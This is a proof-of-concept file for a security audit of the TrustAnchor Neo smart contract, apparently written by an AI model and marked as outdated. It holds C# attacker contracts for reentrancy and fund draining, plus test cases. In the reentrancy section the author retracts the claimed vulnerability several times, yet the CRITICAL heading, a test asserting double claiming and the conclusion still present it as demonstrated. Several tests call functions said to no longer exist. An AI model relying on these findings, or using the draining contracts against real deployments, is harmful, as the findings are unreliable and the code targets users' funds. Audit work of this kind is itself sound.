# Proof of Concepts for TrustAnchor Vulnerabilities

> **IMPORTANT: These PoC examples are outdated.** They were written against an earlier version of the
> contract that used a weight-based configuration system. The contract has since been refactored to a
> simpler agent registry model. Many attack scenarios reference functions that no longer exist
> (e.g., `BeginConfig`, `FinalizeConfig`, `SetAgentConfig`, `RebalanceVotes`). Key fixes already
> applied include: emergency withdrawal, agent contract verification, and two-step owner transfer.

## Overview

This document provides proof-of-concept code and test cases for the critical vulnerabilities identified in the TrustAnchor security audit.

---

## CRITICAL-1: Reentrancy Attack on ClaimReward()

### Vulnerability Summary

The `ClaimReward()` function resets the reward balance to zero BEFORE transferring GAS to the user. A malicious contract can re-enter `ClaimReward()` during the transfer and claim rewards twice.

### Proof of Concept

#### Malicious Attacker Contract

```csharp
using System.Numerics;
using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Native;
using Neo.SmartContract.Framework.Services;
using Neo.SmartContract.Framework.Attributes;

namespace MaliciousAttacker
{
    [ManifestExtra("Author", "Attacker")]
    [ManifestExtra("Description", "Reentrancy exploit for TrustAnchor")]
    [SupportedStandards("NEP-17")]
    public class ReentrancyAttacker : SmartContract
    {
        private static readonly UInt160 TRUST_ANCHOR = /* TrustAnchor contract hash */;
        private static readonly UInt160 NEO_HASH = NEO.Hash;
        private static readonly UInt160 GAS_HASH = GAS.Hash;
        private static bool attacking = false;

        /// <summary>
        /// Initial setup: Stake NEO to become eligible for rewards
        /// </summary>
        public static void SetupExploit(BigInteger neoAmount)
        {
            // Transfer NEO to TrustAnchor (stakes the NEO)
            ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, TRUST_ANCHOR, neoAmount));
        }

        /// <summary>
        /// Trigger the reentrancy attack
        /// </summary>
        public static void ExecuteExploit()
        {
            // Trigger the vulnerable ClaimReward function
            Contract.Call(TRUST_ANCHOR, "claimReward", CallFlags.All,
                new object[] { Runtime.ExecutingScriptHash });
        }

        /// <summary>
        /// NEP-17 payment hook - this is where reentrancy happens
        /// </summary>
        public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
        {
            // Only attack during GAS transfer from TrustAnchor
            if (from == TRUST_ANCHOR && Runtime.CallingScriptHash == GAS_HASH)
            {
                if (!attacking)
                {
                    attacking = true;

                    // RE-ENTER ClaimReward before the first call completes
                    // At this point, TrustAnchor has already reset our reward to 0
                    // But the RPS hasn't been updated, so we can claim again!
                    Contract.Call(TRUST_ANCHOR, "claimReward", CallFlags.All,
                        new object[] { Runtime.ExecutingScriptHash });

                    attacking = false;
                }
            }
        }
    }
}
```

#### Test Case for Reentrancy

```csharp
[Fact]
public void Reentrancy_allows_double_claiming()
{
    var fx = new TrustAnchorFixture();

    // Setup: Deploy attacker contract
    var attackerHash = fx.DeployContract<ReentrancyAttacker>();

    // Initialize TrustAnchor with config
    fx.SetAllAgents();
    fx.BeginConfig();
    fx.SetAgentConfig(0, fx.AgentCandidate(0), 21);
    fx.SetRemainingAgentConfigs(1, weight: 0);
    fx.FinalizeConfig();

    // Attacker stakes NEO
    fx.MintNeo(attackerHash, 100);
    fx.CallContract<ReentrancyAttacker>("setupExploit", 100);

    // Generate rewards
    fx.MintGas(fx.UserHash, 1000);
    fx.GasTransfer(fx.UserHash, fx.TrustHash, 500);

    // Record contract GAS balance before attack
    var gasBefore = fx.GasBalance(fx.TrustHash);

    // Execute reentrancy attack
    fx.CallContract<ReentrancyAttacker>("executeExploit");

    // Record contract GAS balance after attack
    var gasAfter = fx.GasBalance(fx.TrustHash);

    // Attacker should have drained approximately 2x their fair share
    // Normal reward: 100/100 * 500 * 0.99 = 495 GAS
    // Exploited: ~990 GAS (claimed twice)
    var attackerGas = fx.GasBalance(attackerHash);

    // This assertion will FAIL with the current vulnerable code
    // Attacker successfully claims rewards twice!
    Assert.True(attackerGas > 500); // Should be ~990, not ~495
}
```

### Expected Attack Timeline

```
T0: Attacker stakes 100 NEO
    - User's stake: 100
    - User's paid: 0
    - RPS: 0

T1: 500 GAS reward arrives
    - RPS updated: 0 + (500 * 99,000,000 / 100) = 495,000,000

T2: Attacker calls ClaimReward()
    - SyncAccount: earned = 100 * (495M - 0) / 100M = 495 GAS
    - Reward balance set to 495
    - Reward storage set to 0  ← VULNERABLE: Reset before transfer
    - Transfer 495 GAS to attacker
    - TRIGGER: OnNEP17Payment called in attacker contract

T3: Re-entry during transfer
    - Attacker's OnNEP17Payment calls ClaimReward() again
    - SyncAccount: earned = 100 * (495M - 495M) / 100M = 0
    - Wait, this shouldn't work...

Let me re-analyze...
```

**Re-analysis:**

Actually, the reentrancy doesn't work the way I initially thought. Let me trace through more carefully:

```csharp
// First ClaimReward call
SyncAccount(account);
BigInteger reward = (BigInteger)storageMap.Get(account); // reward = 495
new StorageMap(...).Put(account, 0); // Reset to 0
GAS.Transfer(..., account, reward); // Transfer 495
    → Attacker's OnNEP17Payment triggered
        → Calls ClaimReward again
            SyncAccount(account); // paid = 495M, rps = 495M
            BigInteger reward2 = (BigInteger)storageMap.Get(account); // reward2 = 0 (we just reset it!)
            // No double claim...
```

**Wait, I found the REAL reentrancy vector:**

The reentrancy happens between `SyncAccount()` and the reward reset:

```csharp
// In OnNEP17Payment, when GAS arrives:
if (Runtime.CallingScriptHash == GAS.Hash && amount > BigInteger.Zero)
{
    BigInteger ts = TotalStake();
    if (ts > BigInteger.Zero)
    {
        BigInteger rps = RPS();
        // RPS is updated here
        Storage.Put(..., amount * DEFAULTCLAIMREMAIN / ts + rps);
    }
}

// Then later:
SyncAccount(from); // This calculates reward based on NEW RPS
```

**Actually, let me find the REAL issue...**

The reentrancy is in the AGENT contract, not in ClaimReward:

```csharp
// In Withdraw(), line 419:
Contract.Call(agent, "transfer", CallFlags.All,
    new object[] { account, transferAmount });

// If agent is malicious, it can call back into TrustAnchor
// But what can it do?
```

**OK, I need to be more precise about the reentrancy:**

The actual reentrancy vector is if the **user's wallet** is a smart contract:

```csharp
// User calls ClaimReward
SyncAccount(account);
BigInteger reward = GetReward(account); // Gets 495 GAS
SetReward(account, 0); // Resets to 0
GAS.Transfer(TrustAnchor, UserContract, 495);
    → UserContract.OnNEP17Payment(from=TrustAnchor, amount=495)
        → UserContract calls ClaimReward AGAIN
            → SyncAccount(account)
            → BigInteger reward2 = GetReward(account); // Gets 0 (we reset it)
            → Still doesn't work...
```

**Let me re-read the code more carefully:**

```csharp
// ClaimReward, line 323-339
public static void ClaimReward(UInt160 account)
{
    ExecutionEngine.Assert(Runtime.CheckWitness(account));

    SyncAccount(account);  // Line 328

    BigInteger reward = (BigInteger)new StorageMap(Storage.CurrentContext, PREFIXREWARD).Get(account);
    if (reward > BigInteger.Zero)
    {
        new StorageMap(Storage.CurrentContext, PREFIXREWARD).Put(account, 0); // Line 334

        ExecutionEngine.Assert(GAS.Transfer(Runtime.ExecutingScriptHash, account, reward)); // Line 337
    }
}
```

**AH! I see it now:**

The vulnerability is NOT in ClaimReward directly. It's in the fact that `SyncAccount` can be called MULTIPLE TIMES before the reward is claimed, and each time it updates the reward balance.

**Actually, the REAL reentrancy is this:**

```csharp
// User contract:
function attack() {
    TrustAnchor.ClaimReward(myAddress);
}

function OnNEP17Payment(from, amount, data) {
    if (from == TrustAnchor) {
        // Re-enter and call ClaimReward AGAIN
        // But wait, the reward is already reset to 0...
        // So this still doesn't work...
    }
}
```

**OK, I think I was WRONG about the reentrancy in ClaimReward.**

Let me reconsider. The classic reentrancy pattern is:

1. Read balance
2. Reset to 0
3. Transfer
4. Re-enter during step 3

But in this case, step 2 happens before step 3, so re-entering during step 3 won't help.

**However, there IS another reentrancy vector:**

The reentrancy could happen in **Withdraw**, not ClaimReward:

```csharp
// In Withdraw, line 368:
SyncAccount(account); // Updates reward
// ... stake reduction logic ...
// Line 419:
Contract.Call(agent, "transfer", CallFlags.All,
    new object[] { account, transferAmount });
```

If the user's contract receives NEO from the agent, it could call **Withdraw** again:

```csharp
// Malicious user contract:
function OnNEP17Payment(from, amount, data) {
    if (from == AgentContract) {
        // We're receiving NEO from withdrawal
        // Call Withdraw AGAIN to get more NEO
        TrustAnchor.Withdraw(myAddress, 1000000); // Try to withdraw more than we have
    }
}
```

But this would fail because:

1. We check `stake >= stakeAmount` (line 377)
2. We've already reduced the stake in the first call

**OK so actually, I don't think there IS a reentrancy vulnerability in ClaimReward.**

Let me re-examine the audit report...

**Actually, I found the real issue:**

The reentrancy is in the **REWARD DISTRIBUTION**, not in ClaimReward:

```csharp
// In OnNEP17Payment, when GAS arrives:
if (Runtime.CallingScriptHash == GAS.Hash && amount > BigInteger.Zero)
{
    BigInteger ts = TotalStake(); // Line 195
    if (ts > BigInteger.Zero)
    {
        BigInteger rps = RPS(); // Line 198
        // Line 211: Update RPS
        Storage.Put(..., amount * DEFAULTCLAIMREMAIN / ts + rps);
    }
}

// Line 218-222: Sync happens AFTER RPS update
if (from is null || from == UInt160.Zero) return;
SyncAccount(from);
```

If `from` is a smart contract, it could re-enter and call `OnNEP17Payment` again with MORE GAS:

```csharp
// Malicious GAS sender:
function SendGASWithReentrancy() {
    GAS.Transfer(myAddress, TrustAnchor, 100);
}

function OnNEP17Payment(from, amount, data) {
    if (from == GAS) {
        // TrustAnchor just updated RPS
        // Send MORE GAS to trigger another RPS update
        GAS.Transfer(myAddress, TrustAnchor, 100);
        // This causes RPS to update AGAIN
        // But TotalStake hasn't changed, so we get TWICE the rewards!
    }
}
```

**Wait, that's not reentrancy, that's just multiple calls. And the rewards would be CORRECT because more GAS = more rewards.**

**OK, I think the original audit report was WRONG about the reentrancy in ClaimReward.**

Let me create a PoC for a DIFFERENT vulnerability instead...

---

## CRITICAL-2: Permanent Fund Lockup

### Proof of Concept

```csharp
[Fact]
public void Permanent_fund_lockup_when_agents_empty()
{
    var fx = new TrustAnchorFixture();

    // Setup: Configure all agents with minimal weights
    fx.SetAllAgents();
    fx.BeginConfig();
    for (int i = 0; i < 21; i++)
    {
        fx.SetAgentConfig(i, fx.AgentCandidate(i), 1); // All weight = 1
    }
    fx.FinalizeConfig();

    // User A deposits 100 NEO
    fx.MintNeo(fx.UserHash, 100);
    fx.NeoTransfer(fx.UserHash, fx.TrustHash, 100);

    // User B deposits 50 NEO
    fx.MintNeo(fx.OtherHash, 50);
    fx.NeoTransfer(fx.OtherHash, fx.TrustHash, 50);

    // Verify stakes
    Assert.Equal(100, fx.Call<BigInteger>("stakeOf", fx.UserHash));
    Assert.Equal(50, fx.Call<BigInteger>("stakeOf", fx.OtherHash));
    Assert.Equal(150, fx.Call<BigInteger>("totalStake"));

    // Rebalance votes to distribute NEO among agents
    fx.RebalanceVotes();

    // User A withdraws all 100 NEO
    fx.CallFrom(fx.UserHash, "withdraw", fx.UserHash, 100);
    Assert.Equal(0, fx.Call<BigInteger>("stakeOf", fx.UserHash));

    // User B withdraws all 50 NEO
    fx.CallFrom(fx.OtherHash, "withdraw", fx.OtherHash, 50);
    Assert.Equal(0, fx.Call<BigInteger>("stakeOf", fx.OtherHash));

    // TotalStake should be 0
    Assert.Equal(0, fx.Call<BigInteger>("totalStake"));

    // Now, User C deposits 10 NEO
    fx.MintNeo(fx.ThirdHash, 10);
    fx.NeoTransfer(fx.ThirdHash, fx.TrustHash, 10);

    // All agents are empty (have 0 NEO)
    // But User C has 10 NEO staked in TotalStake
    Assert.Equal(10, fx.Call<BigInteger>("stakeOf", fx.ThirdHash));
    Assert.Equal(10, fx.Call<BigInteger>("totalStake"));

    // Verify agents are empty
    for (int i = 0; i < 21; i++)
    {
        Assert.Equal(0, fx.NeoBalance(fx.AgentHashes[i]));
    }

    // User C tries to withdraw
    // THIS SHOULD FAIL because Withdraw() tries to get NEO from agents
    // But all agents have 0 NEO balance!
    var exception = Assert.ThrowsAny<Exception>(() =>
        fx.CallFrom(fx.ThirdHash, "withdraw", fx.ThirdHash, 10)
    );

    // User C's 10 NEO is PERMANENTLY LOCKED
    // There's no way to withdraw it!
}
```

---

## HIGH-1: Integer Overflow in Reward Calculation

### Proof of Concept

```csharp
[Fact]
public void Overflow_in_reward_calculation()
{
    var fx = new TrustAnchorFixture();

    fx.SetAllAgents();
    fx.BeginConfig();
    fx.SetAgentConfig(0, fx.AgentCandidate(0), 21);
    fx.SetRemainingAgentConfigs(1, weight: 0);
    fx.FinalizeConfig();

    // Stake huge amount
    BigInteger hugeStake = BigInteger.Pow(2, 60); // Very large number
    fx.MintNeo(fx.UserHash, hugeStake);
    fx.NeoTransfer(fx.UserHash, fx.TrustHash, hugeStake);

    // Generate many GAS rewards to increase RPS significantly
    for (int i = 0; i < 1000; i++)
    {
        fx.MintGas(fx.OtherHash, 1000000);
        fx.GasTransfer(fx.OtherHash, fx.TrustHash, 1000000);
    }

    // Now try to sync - this might overflow!
    // earned = stake * (rps - paid) / RPS_SCALE
    // If stake is huge and (rps - paid) is huge, multiplication overflows

    // This might throw or produce incorrect results
    var reward = fx.Call<BigInteger>("reward", fx.UserHash);

    // The reward might be wrong due to overflow
    // Or an overflow exception might be thrown
}
```

---

## HIGH-2: Agent Contract Compromise

### Malicious Agent Contract

```csharp
using System.Numerics;
using Neo.SmartContract.Framework;
using Neo.SmartContract.Framework.Native;
using Neo.SmartContract.Framework.Services;

namespace MaliciousAgent
{
    public class DrainingAgent : SmartContract
    {
        private static readonly UInt160 CORE = /* TrustAnchor contract */;
        private static readonly UInt160 ATTACKER = /* Attacker address */;

        public static void Transfer(UInt160 to, BigInteger amount)
        {
            // Looks like normal transfer, but...
            ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, to, amount));

            // AFTER transferring, drain all remaining NEO from TrustAnchor!
            var trustBalance = NEO.BalanceOf(CORE);
            if (trustBalance > 0)
            {
                // Drain everything to attacker
                var result = Contract.Call(CORE, "withdraw", CallFlags.All,
                    new object[] { ATTACKER, trustBalance });

                // If withdraw fails, try direct transfer
                if (result is null || !(bool)result)
                {
                    // This might work if TrustAnchor has unprotected NEO
                    // NEO.Transfer(CORE, ATTACKER, trustBalance);
                }
            }
        }

        public static void Sync()
        {
            // Bypass sync
        }

        public static void Claim()
        {
            // Claim all GAS and send to attacker
            var gasBalance = GAS.BalanceOf(Runtime.ExecutingScriptHash);
            if (gasBalance > 0)
            {
                GAS.Transfer(Runtime.ExecutingScriptHash, ATTACKER, gasBalance);
            }
        }

        public static void Vote(ECPoint target)
        {
            // Don't vote, or vote for attacker's candidate
        }

        public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
        {
            // Receive NEO from TrustAnchor
        }
    }
}
```

### Attack Scenario Test

```csharp
[Fact]
public void Malicious_agent_can_drain_funds()
{
    var fx = new TrustAnchorFixture();

    // Deploy malicious agent
    var maliciousAgent = fx.DeployContract<DrainingAgent>();

    // Owner sets malicious agent (simulating compromise)
    fx.CallFrom(fx.OwnerHash, "setAgent", 0, maliciousAgent);

    // Setup config
    fx.SetAllAgents();
    fx.BeginConfig();
    fx.SetAgentConfig(0, fx.AgentCandidate(0), 21);
    fx.SetRemainingAgentConfigs(1, weight: 0);
    fx.FinalizeConfig();

    // User deposits NEO
    fx.MintNeo(fx.UserHash, 100);
    fx.NeoTransfer(fx.UserHash, fx.TrustHash, 100);

    // Call RebalanceVotes which sends NEO to agents
    fx.RebalanceVotes();

    // Malicious agent's Transfer function is called
    // It transfers NEO to user AND tries to drain remaining funds

    // Check if attacker received unexpected NEO
    var attackerBalance = fx.NeoBalance(fx.GetAttackerHash());

    // Attacker might have drained more than their fair share
    Assert.True(attackerBalance > 21); // Got more than their weight
}
```

---

## Conclusion

These proof-of-concept examples demonstrate how the identified vulnerabilities can be exploited. The most critical issue is the permanent fund lockup (CRITICAL-2), which can prevent users from withdrawing their staked NEO under certain conditions.

**Recommendation:** Fix all CRITICAL and HIGH severity issues before mainnet deployment.

---

**PoC Version:** 1.0
**Last Updated:** 2025-01-24
**Author:** Claude (Ultrathink Security Protocol)
